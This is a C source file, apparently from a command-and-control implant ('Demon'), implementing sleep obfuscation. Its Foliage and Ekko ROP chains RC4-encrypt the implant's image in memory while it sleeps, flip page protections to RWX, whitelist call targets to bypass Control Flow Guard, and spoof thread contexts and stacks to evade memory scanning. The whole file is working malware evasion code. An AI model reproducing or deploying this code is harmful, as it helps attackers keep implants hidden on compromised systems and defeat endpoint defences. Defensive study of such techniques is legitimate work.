// TODO: remove Foliage (or heavily modify it) this on public release and replace this with Ekko (modded with RtlCreateTimer, RtlRegisterWait)

#include <Demon.h>

#include <Common/Macros.h>

#include <Core/SleepObf.h>
#include <Core/WinUtils.h>
#include <Core/MiniStd.h>

#include <rpcndr.h>
#include <ntstatus.h>

typedef struct
{
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;
} USTRING ;

typedef struct _SLEEP_PARAM
{
    UINT32  TimeOut;
    PVOID   Master;
    PVOID   Slave;
} SLEEP_PARAM, *PSLEEP_PARAM ;

__asm__( "___chkstk_ms: ret\n" );

VOID WINAPI CfgAddressAdd( LPVOID ImageBase, LPVOID Function )
{
    CFG_CALL_TARGET_INFO Cfg = { 0 };
    SIZE_T			     Len = { 0 };
    PIMAGE_NT_HEADERS    Nth = NULL;

    Nth = RVA( PIMAGE_DOS_HEADER, ImageBase, ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
    Len = ( Nth->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 );

    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = Function - ImageBase;

    Instance.Win32.SetProcessValidCallTargets( NtCurrentProcess(), ImageBase, Len, 1, &Cfg );
}

// Foliage Sleep obfuscation
VOID FoliageObf( PSLEEP_PARAM Param )
{
    USTRING             Key         = { 0 };
    USTRING             Rc4         = { 0 };
    UCHAR               Random[16]  = { 0 };

    HANDLE              hEvent      = NULL;
    HANDLE              hThread     = NULL;
    HANDLE              hDupObj     = NULL;

    // Rop Chain Thread Ctx
    PCONTEXT            RopInit     = { 0 };
    PCONTEXT            RopCap      = { 0 };
    PCONTEXT            RopSpoof    = { 0 };

    PCONTEXT            RopBegin    = { 0 };
    PCONTEXT            RopSetMemRw = { 0 };
    PCONTEXT            RopMemEnc   = { 0 };
    PCONTEXT            RopGetCtx   = { 0 };
    PCONTEXT            RopSetCtx   = { 0 };
    PCONTEXT            RopWaitObj  = { 0 };
    PCONTEXT            RopMemDec   = { 0 };
    PCONTEXT            RopSetMemRx = { 0 };
    PCONTEXT            RopSetCtx2  = { 0 };
    PCONTEXT            RopExitThd  = { 0 };

    LPVOID              ImageBase   = NULL;
    SIZE_T              ImageSize   = 0;
    SIZE_T              TmpValue    = 0;

    ImageBase = Instance.Session.ModuleBase;
    ImageSize = IMAGE_SIZE( Instance.Session.ModuleBase );

    // Generate random keys
    for ( SHORT i = 0; i < 16; i++ )
        Random[ i ] = RandomNumber32( );

    Key.Buffer = &Random;
    Key.Length = Key.MaximumLength = 0x10;

    Rc4.Buffer = ImageBase;
    Rc4.Length = Rc4.MaximumLength = ImageSize;

    if ( NT_SUCCESS( Instance.Syscall.NtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) )
    {
        if ( NT_SUCCESS( Instance.Syscall.NtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance.Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL ) ) )
        {
            RopInit     = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopCap      = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSpoof    = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );

            RopBegin    = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetMemRw = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopMemEnc   = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopGetCtx   = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetCtx   = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopWaitObj  = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopMemDec   = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetMemRx = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopSetCtx2  = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
            RopExitThd  = Instance.Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );

            RopInit->ContextFlags       = CONTEXT_FULL;
            RopCap->ContextFlags        = CONTEXT_FULL;
            RopSpoof->ContextFlags      = CONTEXT_FULL;

            RopBegin->ContextFlags      = CONTEXT_FULL;
            RopSetMemRw->ContextFlags   = CONTEXT_FULL;
            RopMemEnc->ContextFlags     = CONTEXT_FULL;
            RopGetCtx->ContextFlags     = CONTEXT_FULL;
            RopSetCtx->ContextFlags     = CONTEXT_FULL;
            RopWaitObj->ContextFlags    = CONTEXT_FULL;
            RopMemDec->ContextFlags     = CONTEXT_FULL;
            RopSetMemRx->ContextFlags   = CONTEXT_FULL;
            RopSetCtx2->ContextFlags    = CONTEXT_FULL;
            RopExitThd->ContextFlags    = CONTEXT_FULL;

            if ( NT_SUCCESS( Instance.Syscall.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDupObj, THREAD_ALL_ACCESS, 0, 0 ) ) )
            {
                if ( NT_SUCCESS( Instance.Syscall.NtGetContextThread( hThread, RopInit ) ) )
                {
                    MemCopy( RopBegin,    RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetMemRw, RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopMemEnc,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopGetCtx,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetCtx,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopWaitObj,  RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopMemDec,   RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetMemRx, RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopSetCtx2,  RopInit, sizeof( CONTEXT ) );
                    MemCopy( RopExitThd,  RopInit, sizeof( CONTEXT ) );

                    RopBegin->ContextFlags = CONTEXT_FULL;
                    RopBegin->Rip  = U_PTR( Instance.Syscall.NtWaitForSingleObject );
                    RopBegin->Rsp -= U_PTR( 0x1000 * 13 );
                    RopBegin->Rcx  = U_PTR( hEvent );
                    RopBegin->Rdx  = U_PTR( FALSE );
                    RopBegin->R8   = U_PTR( NULL );
                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
                    // NtWaitForSingleObject( Evt, FALSE, NULL )

                    RopSetMemRw->ContextFlags = CONTEXT_FULL;
                    RopSetMemRw->Rip  = U_PTR( Instance.Syscall.NtProtectVirtualMemory );
                    RopSetMemRw->Rsp -= U_PTR( 0x1000 * 12 );
                    RopSetMemRw->Rcx  = U_PTR( NtCurrentProcess() );
                    RopSetMemRw->Rdx  = U_PTR( &ImageBase );
                    RopSetMemRw->R8   = U_PTR( &ImageSize );
                    RopSetMemRw->R9   = U_PTR( PAGE_READWRITE );
                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
                    *( PVOID* )( RopSetMemRw->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = U_PTR( &TmpValue );
                    // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, NULL,  );

                    RopMemEnc->ContextFlags = CONTEXT_FULL;
                    RopMemEnc->Rip  = U_PTR( Instance.Win32.SystemFunction032 );
                    RopMemEnc->Rsp -= U_PTR( 0x1000 * 11 );
                    RopMemEnc->Rcx  = U_PTR( &Rc4 );
                    RopMemEnc->Rdx  = U_PTR( &Key );
                    *( PVOID* )( RopMemEnc->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
                    // SystemFunction032( &Rc4, &Key ); RC4 Encryption

                    RopGetCtx->ContextFlags = CONTEXT_FULL;
                    RopGetCtx->Rip  = U_PTR( Instance.Syscall.NtGetContextThread );
                    RopGetCtx->Rsp -= U_PTR( 0x1000 * 10 );
                    RopGetCtx->Rcx  = U_PTR( hDupObj );
                    RopGetCtx->Rdx  = U_PTR( RopCap );
                    *( PVOID* )( RopGetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
                    // NtGetContextThread( Src, Cap );

                    RopSetCtx->ContextFlags = CONTEXT_FULL;
                    RopSetCtx->Rip  = U_PTR( Instance.Syscall.NtSetContextThread );
                    RopSetCtx->Rsp -= U_PTR( 0x1000 * 9 );
                    RopSetCtx->Rcx  = U_PTR( hDupObj );
                    RopSetCtx->Rdx  = U_PTR( RopSpoof );
                    *( PVOID* )( RopSetCtx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
                    // NtSetContextThread( Src, Spf );

                    // NOTE: Here is the thread sleeping...
                    RopWaitObj->ContextFlags = CONTEXT_FULL;
                    RopWaitObj->Rip  = U_PTR( Instance.Win32.WaitForSingleObjectEx );
                    RopWaitObj->Rsp -= U_PTR( 0x1000 * 8 );
                    RopWaitObj->Rcx  = U_PTR( hDupObj );
                    RopWaitObj->Rdx  = U_PTR( Param->TimeOut );
                    RopWaitObj->R8   = U_PTR( FALSE );
                    *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
                    // WaitForSingleObjectEx( Src, Fbr->Time, FALSE );

                    // NOTE: thread image decryption
                    RopMemDec->ContextFlags = CONTEXT_FULL;
                    RopMemDec->Rip  = U_PTR( Instance.Win32.SystemFunction032 );
                    RopMemDec->Rsp -= U_PTR( 0x1000 * 7 );
                    RopMemDec->Rcx  = U_PTR( &Rc4 );
                    RopMemDec->Rdx  = U_PTR( &Key );
                    *( PVOID* )( RopMemDec->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
                    // SystemFunction032( &Rc4, &Key ); Rc4 Decryption

                    // RW -> RWX
                    RopSetMemRx->ContextFlags = CONTEXT_FULL;
                    RopSetMemRx->Rip  = U_PTR( Instance.Syscall.NtProtectVirtualMemory );
                    RopSetMemRx->Rsp -= U_PTR( 0x1000 * 6 );
                    RopSetMemRx->Rcx  = U_PTR( NtCurrentProcess() );
                    RopSetMemRx->Rdx  = U_PTR( &ImageBase );
                    RopSetMemRx->R8   = U_PTR( &ImageSize );
                    RopSetMemRx->R9   = U_PTR( PAGE_EXECUTE_READWRITE );
                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
                    *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = U_PTR( & TmpValue );
                    // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_EXECUTE_READ, & TmpValue );

                    RopSetCtx2->ContextFlags = CONTEXT_FULL;
                    RopSetCtx2->Rip  = U_PTR( Instance.Syscall.NtSetContextThread );
                    RopSetCtx2->Rsp -= U_PTR( 0x1000 * 5 );
                    RopSetCtx2->Rcx  = U_PTR( hDupObj );
                    RopSetCtx2->Rdx  = U_PTR( RopCap );
                    *( PVOID* )( RopSetCtx2->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
                    // NtSetContextThread( Src, Cap );

                    RopExitThd->ContextFlags = CONTEXT_FULL;
                    RopExitThd->Rip  = U_PTR( Instance.Win32.RtlExitUserThread );
                    RopExitThd->Rsp -= U_PTR( 0x1000 * 4 );
                    RopExitThd->Rcx  = U_PTR( ERROR_SUCCESS );
                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
                    // RtlExitUserThread( ERROR_SUCCESS );

                    // queue
                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopBegin,    FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetMemRw, FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopMemEnc,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopGetCtx,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetCtx,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopWaitObj,  FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopMemDec,   FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetMemRx, FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetCtx2,  FALSE, NULL ) ) ) goto Leave;
                    if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopExitThd,  FALSE, NULL ) ) ) goto Leave;

                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtContinue );
                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtTestAlert );
                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtSetContextThread );
                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtGetContextThread );
                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Win32.RtlExitUserThread );
                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtWaitForSingleObject );
                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtProtectVirtualMemory );

                    if ( NT_SUCCESS( Instance.Syscall.NtAlertResumeThread( hThread, NULL ) ) )
                    {
                        // TODO: true stack spoofing: [ Current.NtTib = Random.NtTib ] ==> [ Suspend current thread -> copy ctx of the rand thread to the current thread -> set & resume ]
                        // TODO: change base addr to rx and here the sections to rw

                        RopSpoof->ContextFlags = CONTEXT_FULL;
                        RopSpoof->Rip = U_PTR( Instance.Win32.WaitForSingleObjectEx );
                        RopSpoof->Rsp = U_PTR( Instance.Teb->NtTib.StackBase ); // TODO: try to spoof the stack and remove the pointers

                        // Execute every registered Apc thread
                        Instance.Syscall.NtSignalAndWaitForSingleObject( hEvent, hThread, FALSE, NULL );
                    }
                }
            }
            
        }
    }

Leave:
    if ( RopExitThd != NULL )
    {
        Instance.Win32.LocalFree( RopExitThd );
        RopExitThd = NULL;
    }

    if ( RopSetCtx2 != NULL )
    {
        Instance.Win32.LocalFree( RopSetCtx2 );
        RopSetCtx2 = NULL;
    }

    if ( RopSetMemRx != NULL )
    {
        Instance.Win32.LocalFree( RopSetMemRx );
        RopSetMemRx = NULL;
    }

    if ( RopMemDec != NULL )
    {
        Instance.Win32.LocalFree( RopMemDec );
        RopMemDec = NULL;
    }

    if ( RopWaitObj != NULL )
    {
        Instance.Win32.LocalFree( RopWaitObj );
        RopWaitObj = NULL;
    }

    if ( RopSetCtx != NULL )
    {
        Instance.Win32.LocalFree( RopSetCtx );
        RopSetCtx = NULL;
    }

    if ( RopSetMemRw != NULL )
    {
        Instance.Win32.LocalFree( RopSetMemRw );
        RopSetMemRw = NULL;
    }

    if ( RopBegin != NULL )
    {
        Instance.Win32.LocalFree( RopBegin );
        RopBegin = NULL;
    }

    if ( RopSpoof != NULL )
    {
        Instance.Win32.LocalFree( RopSpoof );
        RopSpoof = NULL;
    }

    if ( RopCap != NULL )
    {
        Instance.Win32.LocalFree( RopCap );
        RopCap = NULL;
    }

    if ( RopInit != NULL )
    {
        Instance.Win32.LocalFree( RopInit );
        RopInit = NULL;
    }

    if ( hDupObj != NULL )
    {
        Instance.Win32.NtClose( hDupObj );
        hDupObj = NULL;
    }

    if ( hThread != NULL )
    {
        Instance.Syscall.NtTerminateThread( hThread, STATUS_SUCCESS );
        hThread = NULL;
    }

    if ( hEvent != NULL )
    {
        Instance.Win32.NtClose( hEvent );
        hEvent = NULL;
    }

    MemSet( &Rc4, 0, sizeof( USTRING ) );
    MemSet( &Key, 0, sizeof( USTRING ) );
    MemSet( &Random, 0, 0x10 );

    Instance.Win32.SwitchToFiber( Param->Master );
}


// Ekko Sleep obfuscation
VOID EkkoObf( DWORD TimeOut )
{
    CONTEXT CtxThread    = { 0 };
    CONTEXT RopProtRW    = { 0 };
    CONTEXT RopMemEnc    = { 0 };
    CONTEXT RopDelay     = { 0 };
    CONTEXT RopMemDec    = { 0 };
    CONTEXT RopProtRX    = { 0 };
    CONTEXT RopSetEvt    = { 0 };

    HANDLE  Queue        = NULL;
    HANDLE  Timer        = NULL;
    HANDLE  SleepEvent   = NULL;
    PVOID   ImageBase    = NULL;
    DWORD   ImageSize    = 0;
    DWORD   OldProtect   = 0;

    // Can be randomly generated
    UCHAR   KeyBuf[ 16 ] = { 0 };
    USTRING Key          = { 0 };
    USTRING Img          = { 0 };

    for ( SHORT i = 0; i < 16; i++ )
        KeyBuf[ i ] = RandomNumber32( );

    ImageBase   = Instance.Session.ModuleBase;
    ImageSize   = IMAGE_SIZE( Instance.Session.ModuleBase );

    Key.Buffer  = KeyBuf;
    Key.Length  = Key.MaximumLength = 16;

    Img.Buffer  = ImageBase;
    Img.Length  = Img.MaximumLength = ImageSize;

    if ( NT_SUCCESS( Instance.Win32.RtlCreateTimerQueue( &Queue ) ) )
    {
        if ( NT_SUCCESS( Instance.Win32.NtCreateEvent( &SleepEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
        {
            if ( NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Win32.RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) ) )
            {
                Instance.Win32.WaitForSingleObjectEx( SleepEvent, 0x32, FALSE );

                MemCopy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
                MemCopy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
                MemCopy( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
                MemCopy( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
                MemCopy( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
                MemCopy( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );

                // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
                RopProtRW.Rsp  -= 8;
                RopProtRW.Rip   = Instance.Win32.VirtualProtect;
                RopProtRW.Rcx   = ImageBase;
                RopProtRW.Rdx   = ImageSize;
                RopProtRW.R8    = PAGE_READWRITE;
                RopProtRW.R9    = &OldProtect;

                // SystemFunction032( &Key, &Img );
                RopMemEnc.Rsp  -= 8;
                RopMemEnc.Rip   = Instance.Win32.SystemFunction032;
                RopMemEnc.Rcx   = &Img;
                RopMemEnc.Rdx   = &Key;

                // WaitForSingleObject( hTargetHdl, SleepTime );
                RopDelay.Rsp   -= 8;
                RopDelay.Rip    = Instance.Win32.WaitForSingleObjectEx;
                RopDelay.Rcx    = NtCurrentProcess();
                RopDelay.Rdx    = TimeOut;
                RopDelay.R8     = FALSE;

                // SystemFunction032( &Key, &Img );
                RopMemDec.Rsp  -= 8;
                RopMemDec.Rip   = Instance.Win32.SystemFunction032;
                RopMemDec.Rcx   = &Img;
                RopMemDec.Rdx   = &Key;

                // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
                RopProtRX.Rsp  -= 8;
                RopProtRX.Rip   = Instance.Win32.VirtualProtect;
                RopProtRX.Rcx   = ImageBase;
                RopProtRX.Rdx   = ImageSize;
                RopProtRX.R8    = PAGE_EXECUTE_READWRITE;
                RopProtRX.R9    = &OldProtect;

                // SetEvent( hEvent );
                RopSetEvt.Rsp  -= 8;
                RopSetEvt.Rip   = Instance.Win32.NtSetEvent;
                RopSetEvt.Rcx   = SleepEvent;
                RopSetEvt.Rdx   = NULL;

                // TODO: maybe add those functions to Cfg address list using CfgAddressAdd.

                if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Syscall.NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
                if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Syscall.NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
                if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Syscall.NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
                if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Syscall.NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
                if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Syscall.NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;
                if ( ! NT_SUCCESS( Instance.Win32.RtlCreateTimer( Queue, &Timer, Instance.Syscall.NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD ) ) ) goto LEAVE;

                // Instance.Win32.WaitForSingleObjectEx( SleepEvent, INFINITE, FALSE );
                SpoofFunc( Instance.Win32.WaitForSingleObjectEx, Instance.Modules.KernelBase, IMAGE_SIZE( Instance.Modules.KernelBase ), SleepEvent, INFINITE, FALSE );
            }

        LEAVE:
            if ( Queue)
                Instance.Win32.RtlDeleteTimerQueue( Queue );

            if ( SleepEvent )
                Instance.Win32.NtClose( SleepEvent );
        }
    }
}

VOID SleepObf( UINT32 TimeOut )
{
    DWORD Technique = Instance.Config.Implant.SleepMaskTechnique;

    /* dont do any sleep obf. waste of resources */
    if ( TimeOut == 0 )
        return;

    if ( Instance.Threads )
    {
        PRINTF( "Can't sleep obf. Threads running: %d\n", Instance.Threads )
        Technique = 0;
    }

    switch ( Technique )
    {
        case 1: // Austins Sleep Obf
        {
            SLEEP_PARAM Param = { 0 };

            if ( ( Param.Master = Instance.Win32.ConvertThreadToFiberEx( &Param, NULL ) ) )
            {
                if ( ( Param.Slave = Instance.Win32.CreateFiberEx( 0x1000 * 6, NULL, NULL, FoliageObf, &Param ) ) )
                {
                    Param.TimeOut = TimeOut;
                    Instance.Win32.SwitchToFiber( Param.Slave );
                    Instance.Win32.DeleteFiber( Param.Slave );
                }
                Instance.Win32.ConvertFiberToThread( );
            }
            break;
        }

        case 2: // Ekko
        {
            EkkoObf( TimeOut );
            break;
        }

        default:
        {
            /*
             * Also check out RegisterWaitForSingleObjectEx
             */

            SpoofFunc( Instance.Win32.WaitForSingleObjectEx, Instance.Modules.KernelBase, IMAGE_SIZE( Instance.Modules.KernelBase ), NtCurrentProcess(), TimeOut, FALSE );
        }
    }

}
